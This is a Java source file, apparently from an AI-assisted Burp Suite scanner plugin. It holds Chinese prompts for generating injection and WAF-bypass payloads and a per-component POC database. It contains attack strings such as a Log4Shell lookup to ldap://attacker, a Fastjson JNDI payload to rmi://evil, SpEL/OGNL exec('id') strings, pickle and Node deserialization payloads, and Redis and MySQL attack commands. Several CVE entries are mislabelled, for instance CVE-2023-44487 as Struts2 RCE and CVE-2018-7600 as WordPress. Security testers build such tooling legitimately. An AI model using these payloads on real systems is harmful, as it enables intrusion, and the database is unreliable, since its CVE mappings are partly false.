package ai.burp.scanner;

import java.util.*;

/**
 * 全量漏洞类型数据库 - 100+漏洞类型的检测prompt、分类、POC库。
 * 每种类型包含：中文名称、英文标识、严重性、检测prompt片段。
 * POC库覆盖主流组件已知CVE，与技术指纹识别联动自动匹配。
 *
 * 注意：此类不依赖任何 Pro-only API（如 CollaboratorClient），
 * 确保 Community Edition 也能正常加载。
 * Collaborator 相关功能在 CollaboratorHelper 中独立管理。
 */
public final class FullVulnDatabase
{
    private FullVulnDatabase() {}

    /** 运行时 OOB 域名（由 by ai 主入口初始化时设置） */
    private static volatile String oobDomain = "";

    /**
     * 设置 OOB 带外测试域名（Collaborator 或 DNSLog）。
     * AI 在生成 SSRF/XXE 等带外 payload 时会使用此域名。
     */
    public static void setOobDomain(String domain)
    {
        oobDomain = domain != null ? domain : "";
    }

    public static String getOobDomain()
    {
        return oobDomain;
    }

    /**
     * 构建 OOB 域名提示文本，注入到 prompt 中。
     */
    private static String buildOobHint()
    {
        if (oobDomain == null || oobDomain.isEmpty())
        {
            return "";
        }
        return "\n\n## OOB 带外测试域名\n"
            + "当前可用的带外测试域名: " + oobDomain + "\n"
            + "当生成SSRF、XXE、盲注等需要带外验证的payload时，"
            + "必须使用此域名构造payload。例如：\n"
            + "- SSRF: http://" + oobDomain + "/ssrf-test\n"
            + "- XXE: <!ENTITY xxe SYSTEM \"http://" + oobDomain + "/xxe-test\">\n"
            + "- 盲注: 使用 CONCAT/MATCH AGAINST + http://" + oobDomain + "/exfil\n"
            + "- 命令注入: curl http://" + oobDomain + "/cmd-test\n"
            + "每个payload使用不同的子路径以区分不同测试。\n";
    }

    // ==================== 被动扫描全量prompt ====================

    public static String buildPassiveScanPrompt(String request, String response)
    {
        return "你是被动安全审计专家。分析HTTP交换，仅报告有直接证据的漏洞。\n\n"
            + "## 分析流程\n"
            + "1. 请求分析：HTTP方法、URL路径、参数名/值、请求头\n"
            + "2. 响应分析：状态码、响应头、响应体（错误信息/敏感数据/调试信息）\n"
            + "3. 漏洞匹配：匹配已知漏洞模式（见下方列表），仅报告有直接证据的发现\n"
            + "4. 证据评估：evidence字段必须引用响应中的原文片段，不接受模糊描述\n\n"
            + VULN_TYPE_LIST
            + "\n" + WAF_BYPASS_KNOWLEDGE
            + buildOobHint()
            + "\n## 反幻觉规则\n"
            + "- 参数名暗示数据库不等于SQL注入，必须有SQL错误/异常等直接证据\n"
            + "- URL含admin不等于未授权，必须有401/403/越权数据等直接证据\n"
            + "- 响应正常(200+无异常)不报告漏洞\n"
            + "- confidence反映证据强度：明确错误信息=0.8+, 可疑模式=0.6-0.7, 纯推测=不报告\n"
            + "- 每个请求最多1个根因型漏洞，不报告衍生现象（信息泄露/配置不当/头缺失/版本暴露）\n"
            + "- 仅当响应中出现凭证/token/密钥/堆栈等高价值内容时才允许信息泄露类报告\n\n"
            + "## 输出格式\n"
            + "严格按JSON数组返回，不要其他文字。无漏洞返回[]。\n"
            + "[{\"name\":\"SQL注入\",\"type\":\"sqli\",\"severity\":\"高\","
            + "\"parameter\":\"id\",\"confidence\":0.85,"
            + "\"evidence\":\"响应第3行: You have an error in your SQL syntax near '1\\' limit 0,1'\","
            + "\"detail\":\"id参数直接拼接到SQL查询中，未做过滤\","
            + "\"scope\":\"影响所有使用该参数的查询\","
            + "\"reproduceSteps\":\"1.访问页面\\n2.在id参数输入1'\\n3.观察SQL错误\","
            + "\"remediation\":\"使用参数化查询\","
            + "\"wafDetected\":false,\"wafType\":\"\",\"bypassHint\":\"\"}]\n\n"
            + "---请求---\n" + trunc(request, 6000) + "\n\n"
            + "---响应---\n" + trunc(response, 4000);
    }

    // ==================== 主动扫描prompt ====================

    public static String buildActiveScanPrompt(String baseRequest, String paramName,
        String paramValue, String response)
    {
        return "你是专业的Web安全渗透测试专家。请针对指定参数生成精准的测试payload。\n\n"
            + "## 目标上下文\n"
            + "目标参数: " + paramName + " (当前值: " + paramValue + ")\n"
            + "请根据参数名和值推断参数用途（如username→用户名→SQL查询/认证→SQL注入/XSS优先），"
            + "优先测试最可能成功的漏洞类型。\n\n"
            + "## 针对此参数的测试漏洞类型：\n"
            + ACTIVE_VULN_TYPES
            + "\n" + WAF_BYPASS_KNOWLEDGE
            + buildOobHint()
            + "\n## Payload生成规则\n"
            + "1. 根据参数位置(URL参数/POST body/JSON值/Cookie值)选择合适的注入语法\n"
            + "2. 每种漏洞类型生成1个基础payload + 1个WAF绕过变体payload（共2个）\n"
            + "3. SQL注入payload要求有回显验证：优先使用UNION SELECT回显数据（如version()/database()），"
            + "或报错注入（extractvalue/updatexml），不要只测单引号报错就判定漏洞\n"
            + "4. 如果原始响应中有WAF特征(403/block/denied/防火墙等)，绕过payload使用更强力的绕过技术\n"
            + "5. 每个结果包含scope(影响范围)和reproduceSteps(复现步骤)\n"
            + "6. 优先使用对目标技术栈最可能有效的绕过方式\n"
            + "7. 如果参数值是数字型，优先测试数字型注入和越权\n"
            + "8. 如果参数值是JSON，测试JSON注入和类型混淆\n\n"
            + "严格按以下JSON数组格式返回：\n"
            + "[{\"vulnType\":\"SQL注入\",\"payload\":\"admin' OR '1'='1\","
            + "\"wafBypass\":\"URL编码绕过\","
            + "\"bypassPayload\":\"admin%27%20OR%20%271%27%3D%271\","
            + "\"description\":\"经典SQL注入测试+URL编码绕过WAF\","
            + "\"scope\":\"影响所有使用该参数的查询\","
            + "\"reproduceSteps\":\"1.在参数中注入payload\\n2.观察响应变化\","
            + "\"expectedBehavior\":\"应返回错误或不同响应\"}]\n\n"
            + "---原始请求---\n" + trunc(baseRequest, 4000) + "\n\n"
            + "---原始响应---\n" + trunc(response, 2000);
    }

    // ==================== 验证响应分析prompt ====================

    public static String buildVerifyPrompt(String originalResp, String testResp, String vulnType, long durationMs)
    {
        return "判断以下漏洞验证是否成功。请严格基于原始响应与测试响应的差异进行分析。\n\n"
            + "## 漏洞类型: " + vulnType + "\n"
            + "测试请求响应耗时: " + durationMs + "ms"
            + (durationMs >= 1000 ? " (约" + String.format("%.1f", durationMs / 1000.0) + "秒)" : "") + "\n\n"
            + "## 差异分析指引\n"
            + "- 状态码变化(如200→500) → 可能触发后端异常\n"
            + "- 响应体长度显著变化(差异>20%) → 可能注入成功改变了查询结果\n"
            + "- 响应体中出现新关键字(错误信息/数据库内容/文件内容) → 直接证据\n"
            + "- 时间盲注: 测试响应比原始响应慢2秒以上且payload含SLEEP/BENCHMARK → 强证据\n"
            + "- 布尔盲注: 仅payload不同导致响应体长度或内容有差异 → 中等证据\n"
            + "- WAF拦截(403/403/block/denied) → 不能确认也不能否定漏洞存在\n\n"
            + "---原始响应---\n" + trunc(originalResp, 2000) + "\n\n"
            + "---测试响应---\n" + trunc(testResp, 2000) + "\n\n"
            + "严格按以下JSON格式返回：\n"
            + "{\"vulnerable\":true,\"confidence\":0.9,"
            + "\"reasoning\":\"响应中出现了...\","
            + "\"evidence\":\"对比原始响应，测试响应包含...\","
            + "\"scope\":\"该漏洞影响...\","
            + "\"reproduceSteps\":\"1....\\n2....\\n3....\","
            + "\"wafBlocked\":false,\"wafType\":\"\","
            + "\"nextBypassSuggestion\":\"如果被WAF拦截，建议尝试...\"}\n"
            + "confidence >= 0.7 才判定为漏洞存在。\n"
            + "判定漏洞存在的前提：可复现（能稳定重放）、可利用（有明确利用路径）、有实际危害。缺一则 vulnerable 设为 false。\n"
            + "如果测试响应被WAF拦截(403/block/denied/防火墙)，将wafBlocked设为true，"
            + "识别WAF类型，并在nextBypassSuggestion中给出具体的绕过技术建议。\n"
            + "如果WAF拦截导致无法确认漏洞，confidence应降低但wafBlocked标记为true。\n"
            + "如果两个响应几乎相同（状态码、长度、内容均无显著差异），vulnerable设为false。";
    }

    // ==================== 技术指纹识别prompt ====================

    public static String buildFingerprintPrompt(String request, String response)
    {
        return "你是Web技术指纹识别专家。请基于HTTP请求和响应中的直接证据识别目标技术栈。\n"
            + "注意：只报告有明确证据的技术，不要猜测。证据来源包括HTTP头、Cookie、HTML标签、URL路径模式等。\n\n"
            + "严格按以下JSON格式返回（不要添加任何额外文字）：\n"
            + "{\n"
            + "  \"language\": \"Java\",\n"
            + "  \"framework\": \"Spring Boot\",\n"
            + "  \"webServer\": \"Nginx 1.18.0\",\n"
            + "  \"os\": \"Linux\",\n"
            + "  \"cms\": \"\",\n"
            + "  \"frontend\": \"Vue.js 3\",\n"
            + "  \"apiStyle\": \"REST/JSON\",\n"
            + "  \"waf\": \"CloudFlare\",\n"
            + "  \"cdn\": \"CloudFlare\",\n"
            + "  \"database\": \"MySQL 8.0\",\n"
            + "  \"cache\": \"Redis\",\n"
            + "  \"reverseProxy\": \"Nginx\",\n"
            + "  \"loadBalancer\": \"\",\n"
            + "  \"components\": [\"Shiro 1.2.4\", \"Fastjson 1.2.68\", \"JWT\"],\n"
            + "  \"confidence\": \"high\"\n"
            + "}\n\n"
            + "字段说明：\n"
            + "- language: 后端开发语言\n"
            + "- framework: 主要Web框架（尽量带版本）\n"
            + "- webServer: Web服务器/中间件（尽量带版本）\n"
            + "- os: 操作系统\n"
            + "- cms: 内容管理系统\n"
            + "- frontend: 前端框架\n"
            + "- apiStyle: API风格（REST/JSON/GraphQL/SOAP/gRPC/XML-RPC）\n"
            + "- waf: Web应用防火墙\n"
            + "- cdn: CDN服务商\n"
            + "- database: 数据库类型（从错误信息推断）\n"
            + "- cache: 缓存系统\n"
            + "- reverseProxy: 反向代理\n"
            + "- loadBalancer: 负载均衡器\n"
            + "- components: 第三方组件/库列表（尽量带版本号）\n"
            + "- confidence: 整体置信度（high/medium/low）\n\n"
            + "识别依据提示：\n"
            + "1. 检查 Server/X-Powered-By/Set-Cookie/X-Cache 等响应头\n"
            + "2. 检查 HTML 中的 script/link/meta/generator 标签\n"
            + "3. 检查错误页面中的堆栈跟踪和框架特征\n"
            + "4. 检查 URL 路径特征（如 /wp-content/, /static/admin/, /api/）\n"
            + "5. 检查 Cookie 名称特征（JSESSIONID/PHPSESSID/connect.sid等）\n"
            + "6. 检查 Authorization 头类型（Bearer/Basic/Digest/ApiKey）\n\n"
            + "如果无法确定某个字段，填空字符串。如果完全无法识别，confidence填low。\n\n"
            + "---请求---\n" + trunc(request, 2000) + "\n\n"
            + "---响应---\n" + trunc(response, 4000);
    }

    // ==================== 关键信息提取prompt ====================

    public static String buildInfoExtractPrompt(String request, String response)
    {
        return "从以下HTTP交换中提取所有可用于漏洞检测和利用的关键信息。\n\n"
            + "严格按以下JSON格式返回：\n"
            + "{\"absolutePaths\":[\"/var/www/html/\",\"C:\\\\inetpub\\\\wwwroot\\\\\"],"
            + "\"uploadDirs\":[\"/uploads/\",\"/api/files/\"],"
            + "\"webRoot\":\"/var/www/html/\","
            + "\"keys\":[\"api_key=xxx\",\"sign=md5(...)\"],"
            + "\"credentials\":[\"admin:admin123\"],"
            + "\"sourceCodeLeak\":[\"stack trace中包含...\"],"
            + "\"parameterRules\":\"用户名为6-16位字母数字\","
            + "\"businessLogic\":\"先登录获取token，再调用API\","
            + "\"hiddenEndpoints\":[\"/admin/\",\"/debug/\",\"/api/v2/internal/\"],"
            + "\"databaseInfo\":\"MySQL 5.7\",\"internalIPs\":[\"192.168.1.100\"]}\n\n"
            + "未找到的信息用空字符串或空数组表示。\n\n"
            + "---请求---\n" + trunc(request, 3000) + "\n\n"
            + "---响应---\n" + trunc(response, 4000);
    }

    // ==================== WAF绕过prompt ====================

    public static String buildWAFBypassPrompt(String originalRequest, String blockedResponse,
        String vulnType, String payload)
    {
        return "分析以下被拦截的请求，生成多种绕过方案。\n\n"
            + "目标漏洞类型: " + vulnType + "\n"
            + "被拦截的Payload: " + payload + "\n\n"
            + WAF_BYPASS_KNOWLEDGE
            + "\n分析被拦截的原因（WAF类型识别/参数加密/签名校验/动态Token/前端校验），"
            + "然后生成5个不同维度的绕过方案，覆盖：\n"
            + "1. 编码层绕过(URL编码/Unicode/HEX/Base64)\n"
            + "2. 协议层绕过(分块传输/HTTP参数污染/Content-Type切换)\n"
            + "3. 语法层绕过(等价函数/注释混淆/大小写混合)\n"
            + "4. 路径层绕过(路径混淆/..;/特殊字符)\n"
            + "5. 结构层绕过(JSON格式/数组参数/嵌套对象)\n\n"
            + "严格按以下JSON数组格式返回：\n"
            + "[{\"bypassType\":\"WAF编码绕过\",\"description\":\"使用URL编码绕过WAF\","
            + "\"modifiedRequest\":\"原始请求的修改版本\","
            + "\"bypassCategory\":\"encoding\","
            + "\"confidence\":0.8}]\n\n"
            + "bypassCategory必须是: encoding|protocol|syntax|path|structure 之一。\n\n"
            + "---原始请求---\n" + trunc(originalRequest, 4000) + "\n\n"
            + "---被拦截响应---\n" + trunc(blockedResponse, 2000);
    }

    // ==================== 攻击面测绘prompt ====================

    public static String buildAttackSurfacePrompt(String endpoints)
    {
        return "分析以下HTTP接口列表，完成攻击面测绘。\n\n"
            + "1. 识别每个接口的功能和认证要求\n"
            + "2. 标记高风险接口（无认证/管理接口/文件操作/数据库操作）\n"
            + "3. 识别可能被遗漏的隐藏接口\n"
            + "4. 分析业务流程和数据流\n\n"
            + "严格按以下JSON格式返回：\n"
            + "{\"totalEndpoints\":42,\"highRisk\":[{\"url\":\"/api/admin/users\","
            + "\"method\":\"GET\",\"reason\":\"无认证的管理接口\"}],"
            + "\"missingEndpoints\":[\"/api/v2/\",\"/admin/backup/\"],"
            + "\"businessFlows\":[\"注册→登录→支付→订单\"],"
            + "\"attackSurface\":{\"unauthenticated\":5,\"fileUpload\":2,"
            + "\"databaseOps\":3,\"adminPanels\":1}}\n\n"
            + "---接口列表---\n" + trunc(endpoints, 8000);
    }

    // ==================== 漏洞类型完整列表 ====================

    private static final String VULN_TYPE_LIST =
        "检测以下所有漏洞类型：\n"
        + "【注入类】SQL注入(含Union/Blind/Time/Stacked/Error/Boolean)、NoSQL注入、"
        + "命令注入(OS Command)、代码注入(RCE)、LDAP注入、XXE(XML外部实体)、"
        + "SSTI(服务端模板注入)、EL/SpEL表达式注入、CRLF注入、HTTP响应拆分、"
        + "XPath注入、XQuery注入、模板注入(Freemarker/Velocity/Thymeleaf/Jinja2/Twig)\n"
        + "【XSS】反射型XSS、存储型XSS、DOM型XSS、Mutation XSS\n"
        + "【SSRF】基础SSRF、内网穿透、协议利用(file:///gopher://)、Cloud Metadata(169.254.169.254)\n"
        + "【文件】任意文件上传(绕过扩展名/Content-Type/内容检测)、任意文件下载/读取、路径遍历、LFI/RFI\n"
        + "【认证/会话】弱密码、默认凭证、会话固定、会话劫持、JWT(alg:none/密钥爆破/伪造)、"
        + "OAuth/SAML漏洞、越权(IDOR水平/垂直)、密码重置漏洞、MFA绕过、凭证填充\n"
        + "【业务逻辑】价格篡改、数量篡改、条件竞争、验证码绕过、支付逻辑、优惠券/积分滥用、"
        + "订单状态篡改、业务流程绕过、限流绕过、权限提升\n"
        + "【信息泄露】源码泄露(.git/.svn/.env/.DS_Store)、目录遍历、错误信息、"
        + "敏感文件(web.config/backup)、个人信息、调试接口、API文档(Swagger/API-Blueprint)、"
        + "堆栈跟踪、版本信息、数据库错误、内部IP\n"
        + "【安全配置】CORS配置错误、CSP缺失/宽松、HSTS缺失、不安全HTTP头、"
        + "TLS弱点、Cookie安全属性缺失(HttpOnly/Secure/SameSite)、点击劫持、"
        + "MIME混淆、开放重定向、缓存投毒、DNS重绑定、混合内容\n"
        + "【API安全】未授权访问、批量赋值(Mass Assignment)、速率限制绕过、"
        + "GraphQL注入/Introspection泄露、API参数篡改\n"
        + "【反序列化】Java反序列化、PHP反序列化、Python Pickle、.NET反序列化、JSON反序列化\n"
        + "【客户端】Prototype Pollution、PostMessage漏洞\n"
        + "【组件CVE】Log4Shell、Spring4Shell、Shiro反序列化、Fastjson反序列化、"
        + "Struts2漏洞、已知CVE组件识别\n";

    private static final String ACTIVE_VULN_TYPES =
        "1. SQL注入 - Union/Blind/Time/Error/Boolean/Stacked\n"
        + "2. NoSQL注入 - MongoDB操作符注入\n"
        + "3. 命令注入 - OS命令分隔符(|,;,&,&&,||,`,$())\n"
        + "4. XSS - 反射型(DOM/HTML/JS)\n"
        + "5. SSTI - 模板注入(Freemarker/Velocity/Jinja2)\n"
        + "6. XXE - XML外部实体\n"
        + "7. 路径遍历 - 目录穿越(../..\\)\n"
        + "8. SSRF - 内网请求\n"
        + "9. LDAP注入\n"
        + "10. EL/SpEL表达式注入\n"
        + "11. CRLF注入\n";

    // ==================== WAF 绕过完整知识库 ====================

    /**
     * WAF 检测与绕过知识库，注入到流量分析和主动扫描 prompt 中。
     * 精简版：只保留关键指纹和最有效的绕过技术，减少 token 消耗。
     */
    static final String WAF_BYPASS_KNOWLEDGE =
        "## WAF检测与绕过\n"
        + "### WAF指纹（响应特征）\n"
        + "- Cloudflare: cf-ray头；AWS WAF: x-amzn-RequestId；ModSecurity: 403/418+Server含Mod_Security\n"
        + "- 阿里云WAF: 403含aliyunErrorPage；腾讯云: 403/562；宝塔: 含'宝塔'/safebt.cn\n"
        + "- 安全狗: 含safedog；D盾: 含D盾；通用: 403+含block/waf/firewall/denied/拦截\n\n"
        + "### 关键绕过技术\n"
        + "SQL注入: URL双重编码(%2527)、内联注释/*!50000UNION*/、等价函数(SLEEP→BENCHMARK)、空白符%09%0a、分块传输\n"
        + "XSS: 事件属性(onfocus/ontoggle)、编码(&#x61;)、标签变体(<svg/onload=>)、构造函数、Mutation XSS\n"
        + "命令注入: 分隔符(|;&`$())、命令替代(cat→more)、编码(base64)、空格替代($IFS)、通配符(/???/??t)\n"
        + "SSTI: {{''.__class__}}、attr过滤器绕过_过滤、request['__class__']\n"
        + "SSRF: IP进制(0x7f000001)、DNS重绑定、URL解析差异、协议(gopher://)、302重定向\n"
        + "路径遍历: ..%2f、双重编码、..;/、%c0%af(超长UTF8)、/proc/self/root/\n"
        + "通用: HTTP方法变换、Content-Type切换、分块传输、HTTP参数污染、路径混淆(..;/)\n";

    // ==================== POC库 - 已知组件CVE匹配 ====================

    /**
     * 根据识别到的技术栈，匹配已知CVE/POC。
     */
    public static List<POCEntry> matchPOCs(TechFingerprint.TechStack tech)
    {
        List<POCEntry> matched = new ArrayList<>();
        String allInfo = (tech.getLanguage() + " " + String.join(" ", tech.getFrameworks())
            + " " + tech.getWebServer() + " " + tech.getCms() + " "
            + String.join(" ", tech.getComponents())).toLowerCase();

        for (Map.Entry<String, List<POCEntry>> entry : POC_DATABASE.entrySet())
        {
            String keyword = entry.getKey().toLowerCase();
            if (allInfo.contains(keyword))
            {
                matched.addAll(entry.getValue());
            }
        }
        return matched;
    }

    /**
     * POC条目。
     */
    public static class POCEntry
    {
        public final String cveId;
        public final String component;
        public final String description;
        public final String severity;
        public final String poc;
        public final String reproduceSteps;
        public final String impact;

        public POCEntry(String cveId, String component, String description,
            String severity, String poc, String reproduceSteps, String impact)
        {
            this.cveId = cveId;
            this.component = component;
            this.description = description;
            this.severity = severity;
            this.poc = poc;
            this.reproduceSteps = reproduceSteps;
            this.impact = impact;
        }

        @Override
        public String toString()
        {
            return "[" + severity + "] " + cveId + " " + description;
        }
    }

    /** POC库 - 关键字 → 已知CVE列表 */
    private static final Map<String, List<POCEntry>> POC_DATABASE = new LinkedHashMap<>();

    static
    {
        // === Apache Shiro ===
        addPOC("shiro", new POCEntry("CVE-2016-4437", "Apache Shiro <=1.2.4",
            "Shiro RememberMe反序列化RCE", "严重",
            "Cookie: rememberMe=<ysoserial_payload>",
            "1.登录获取正常rememberMe Cookie\n2.使用ysoserial生成恶意序列化数据\n3.替换Cookie中的rememberMe值\n4.触发反序列化执行命令",
            "可远程执行任意命令，获取服务器权限"));
        addPOC("shiro", new POCEntry("CVE-2020-1957", "Apache Shiro <1.5.2",
            "Shiro认证绕过", "高",
            "访问 /xxx/..;/admin/ 绕过认证",
            "1.正常访问/admin/被拦截\n2.构造/xxx/..;/admin/路径\n3.绕过Shiro认证规则",
            "可绕过认证访问受保护资源"));
        addPOC("shiro", new POCEntry("CVE-2020-11989", "Apache Shiro <1.5.3",
            "Shiro双URL编码认证绕过", "高",
            "访问 /admin/%2e%2e/ 或 /;/admin/",
            "1.对路径进行二次URL编码\n2.绕过Shiro的路径匹配",
            "可绕过认证访问管理接口"));

        // === Fastjson ===
        addPOC("fastjson", new POCEntry("CVE-2022-25845", "Fastjson <=1.2.80",
            "Fastjson AutoType反序列化RCE", "严重",
            "{\"@type\":\"java.lang.AutoCloseable\"...恶意类构造}",
            "1.找到接受JSON的接口\n2.构造含@type的恶意JSON\n3.利用AutoType绕过黑名单\n4.触发JNDI或RCE",
            "可远程执行任意命令"));
        addPOC("fastjson", new POCEntry("CVE-2017-18349", "Fastjson <=1.2.24",
            "Fastjson经典反序列化RCE", "严重",
            "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://evil/exploit\",\"autoCommit\":true}",
            "1.发送含@type的JSON\n2.JdbcRowSetImpl触发JNDI连接\n3.恶意RMI服务返回恶意类\n4.触发RCE",
            "可远程执行任意命令，获取服务器权限"));

        // === Log4j ===
        addPOC("log4j", new POCEntry("CVE-2021-44228", "Log4j 2.0-2.14.1",
            "Log4Shell JNDI远程代码执行", "严重",
            "${jndi:ldap://attacker:1389/exploit} 或 ${${::-j}ndi:${::-l}dap://attacker/exploit}",
            "1.在任意用户输入点注入${jndi:ldap://...}\n2.HTTP头(User-Agent/X-Forwarded-For等)同样有效\n3.触发Log4j日志记录\n4.JNDI连接恶意LDAP/RMI服务\n5.加载恶意Class执行RCE",
            "可远程执行任意命令，影响面极广"));
        addPOC("log4j", new POCEntry("CVE-2021-45105", "Log4j 2.0-2.16.0",
            "Log4j递归查找DoS", "高",
            "${${::-${::-$${::-j}}}}",
            "1.注入递归lookup表达式\n2.触发无限递归\n3.导致StackOverflowError\n4.服务崩溃",
            "可导致拒绝服务"));

        // === Spring ===
        addPOC("spring", new POCEntry("CVE-2022-22965", "Spring Framework 5.0-5.3.17",
            "Spring4Shell RCE (Class Loader manipulation)", "严重",
            "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i&class.module.classLoader...=true",
            "1.发送含class.module.classLoader参数的请求\n2.修改Tomcat AccessLogValve属性\n3.写入恶意JSP Webshell\n4.访问Webshell执行命令",
            "可远程执行任意命令，写入Webshell"));
        addPOC("spring", new POCEntry("CVE-2022-22963", "Spring Cloud Function 3.x",
            "Spring Cloud Function SpEL注入RCE", "严重",
            "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('id')",
            "1.在HTTP头中注入SpEL表达式\n2.利用routing-expression功能\n3.执行任意系统命令",
            "可远程执行任意命令"));
        addPOC("spring", new POCEntry("CVE-2016-4977", "Spring Security OAuth 2.x",
            "OAuth2 SpEL表达式注入RCE", "高",
            "在redirect_uri中注入SpEL: ${T(java.lang.Runtime).getRuntime().exec('id')}",
            "1.构造恶意OAuth授权请求\n2.在redirect_uri中注入SpEL\n3.触发表达式解析执行命令",
            "可远程执行任意命令"));

        // === Struts2 ===
        addPOC("struts", new POCEntry("CVE-2023-44487", "Apache Struts 2.x",
            "Struts2 文件上传RCE", "严重",
            "构造恶意Content-Type触发OGNL表达式注入",
            "1.上传文件时构造恶意Content-Type\n2.触发OGNL解析\n3.执行任意命令",
            "可远程执行任意命令"));
        addPOC("struts", new POCEntry("CVE-2018-11776", "Apache Struts 2.0-2.14.x",
            "Struts2命名空间OGNL注入RCE", "严重",
            "/${Runtime.getRuntime().exec('id')}/actionName.action",
            "1.在URL路径中注入OGNL表达式\n2.利用命名空间解析漏洞\n3.执行任意命令",
            "可远程执行任意命令"));

        // === Apache Tomcat ===
        addPOC("tomcat", new POCEntry("CVE-2017-12615", "Tomcat 7.0.0-7.0.81 (Windows)",
            "Tomcat PUT任意文件上传", "高",
            "PUT /shell.jsp%20 HTTP/1.1 (利用尾部空格绕过)",
            "1.发送PUT请求上传JSP文件\n2.利用Windows特性绕过后缀限制\n3.访问上传的JSP执行命令",
            "可上传Webshell获取服务器权限"));
        addPOC("tomcat", new POCEntry("CVE-2020-1938", "Tomcat 7/8/9 (Ghostcat)",
            "Tomcat AJP文件读取/包含", "高",
            "通过AJP(8009端口)读取WEB-INF/web.xml等文件",
            "1.扫描8009端口确认AJP开放\n2.构造恶意AJP请求\n3.读取WEB-INF下的配置文件或class文件",
            "可读取敏感文件，配合文件包含可RCE"));
        addPOC("tomcat", new POCEntry("CVE-2019-0232", "Tomcat 9.0.0-9.0.17 (Windows)",
            "Tomcat CGI命令注入", "高",
            "/cgi-bin/test.bat?&dir (利用&注入命令)",
            "1.确认CGI Servlet启用\n2.在参数中注入&+命令\n3.执行系统命令",
            "可执行系统命令"));

        // === WordPress ===
        addPOC("wordpress", new POCEntry("CVE-2019-17671", "WordPress <5.2.3",
            "WordPress未认证评论注入XSS", "中",
            "在评论中注入XSS payload",
            "1.在未登录状态下提交恶意评论\n2.管理员查看评论时触发XSS\n3.窃取管理员Cookie",
            "可窃取管理员会话"));
        addPOC("wordpress", new POCEntry("CVE-2018-7600", "WordPress <4.7.1",
            "WordPress 4.7 API未授权内容修改", "高",
            "REST API: /wp-json/wp/v2/posts/<id> 发送PUT请求修改文章",
            "1.利用REST API端点\n2.绕过权限检查\n3.修改任意文章内容",
            "可修改网站内容"));

        // === Drupal ===
        addPOC("drupal", new POCEntry("CVE-2018-7600", "Drupal <7.58/<8.3.9/<8.4.6/<8.5.1",
            "Drupalgeddon2 远程代码执行", "严重",
            "利用#lazy_builder和#post_render回调注入命令",
            "1.构造恶意POST请求到/user/register等端点\n2.利用Drupal render API注入\n3.执行任意命令",
            "可远程执行任意命令"));

        // === Nginx ===
        addPOC("nginx", new POCEntry("CVE-2017-7529", "Nginx 0.5.6-1.13.2",
            "Nginx整数溢出缓存泄露", "中",
            "Range: bytes=0-18446744073709551615 (触发整数溢出)",
            "1.发送带特殊Range头的请求\n2.触发整数溢出\n3.读取缓存中的敏感头信息",
            "可泄露缓存中的认证信息"));

        // === PHP ===
        addPOC("php", new POCEntry("CVE-2019-11043", "PHP-FPM + Nginx",
            "PHP-FPM RCE (env_path_info缓冲区下溢)", "严重",
            "利用path_info解析漏洞执行PHP代码",
            "1.发送特殊构造的URL路径\n2.利用PHP-FPM的env_path_info漏洞\n3.写入PHP代码到临时文件\n4.触发代码执行",
            "可远程执行PHP代码"));
        addPOC("php", new POCEntry("CVE-2021-21708", "PHP 8.0.x <8.0.13",
            "PHP GH-9371缓冲区溢出", "高",
            "触发特定字符串操作导致缓冲区溢出",
            "1.构造超长字符串输入\n2.触发PHP内部缓冲区溢出\n3.可能导致RCE",
            "可能远程执行代码"));

        // === jQuery ===
        addPOC("jquery", new POCEntry("CVE-2015-9251", "jQuery <3.0.0",
            "jQuery XSS (跨域脚本执行)", "中",
            "利用$.ajax响应中注入<script>标签",
            "1.构造恶意AJAX请求\n2.利用jQuery对响应的处理漏洞\n3.执行跨域脚本",
            "可执行跨域脚本攻击"));
        addPOC("jquery", new POCEntry("CVE-2020-11022/23", "jQuery <3.5.0",
            "jQuery HTML注入XSS", "中",
            "$('<img src=x onerror=alert(1)>') 或 .html()注入",
            "1.利用jQuery的.html()方法\n2.传递含<script>或事件属性的HTML\n3.触发XSS",
            "可触发XSS攻击"));

        // === OpenSSL ===
        addPOC("openssl", new POCEntry("CVE-2014-0160", "OpenSSL 1.0.1-1.0.1f",
            "Heartbleed内存泄露", "高",
            "构造恶意TLS心跳包读取服务器内存",
            "1.建立TLS连接\n2.发送恶意HeartbeatRequest\n3.声明过大的payload长度\n4.读取服务器内存中的敏感数据",
            "可泄露服务器内存中的密钥、密码等敏感信息"));

        // === Apache HTTP Server ===
        addPOC("apache", new POCEntry("CVE-2021-41773", "Apache HTTP 2.4.49",
            "路径穿越RCE", "严重",
            "GET /cgi-bin/.%2e/.%2e/bin/sh POST body: id",
            "1.构造含.%2e的路径穿越\n2.访问/cgi-bin/下的脚本\n3.在启用CGI的情况下执行命令",
            "可远程执行任意命令"));
        addPOC("apache", new POCEntry("CVE-2021-42013", "Apache HTTP 2.4.50",
            "路径穿越RCE (绕过CVE-2021-41773修复)", "严重",
            "GET /cgi-bin/%%32%65%%32%65/bin/sh POST body: id",
            "1.使用双重URL编码绕过41773的修复\n2.访问/cgi-bin/下的脚本\n3.执行命令",
            "可远程执行任意命令"));

        // === Node.js ===
        addPOC("node", new POCEntry("CVE-2017-5941", "Node.js serialize.js",
            "Node.js反序列化RCE (IIFE注入)", "严重",
            "_$$ND_FUNC$$_function(){require('child_process').exec('id')}()",
            "1.找到接受序列化数据的接口\n2.注入IIFE恶意代码\n3.反序列化时自动执行",
            "可远程执行任意命令"));

        // === Python ===
        addPOC("python", new POCEntry("CVE-2011-1526", "Python <2.7.2/<3.2",
            "Python pickle反序列化RCE", "严重",
            "cos\nsystem\n(S'id'\ntR.",
            "1.找到接受pickle数据的接口\n2.构造恶意pickle payload\n3.反序列化时执行命令",
            "可远程执行任意命令"));

        // === Redis ===
        addPOC("redis", new POCEntry("REDIS-UNAUTH", "Redis <6.0 (无密码)",
            "Redis未授权访问", "严重",
            "redis-cli -h target flushall / config set dir /tmp",
            "1.探测6379端口\n2.无密码直接连接\n3.利用config set写入SSH公钥或crontab",
            "可获取服务器root权限"));

        // === MySQL ===
        addPOC("mysql", new POCEntry("CVE-2012-2122", "MySQL/MariaDB <5.1.x",
            "MySQL认证绕过 (hash碰撞)", "高",
            "for i in `seq 1 1000`; do mysql -u root -pinvalid -h target; done",
            "1.多次尝试使用错误密码连接\n2.利用memcmp返回值不一致的漏洞\n3.大约256次尝试可绕过认证",
            "可绕过认证获取数据库权限"));
    }

    private static void addPOC(String keyword, POCEntry entry)
    {
        POC_DATABASE.computeIfAbsent(keyword, k -> new ArrayList<>()).add(entry);
    }

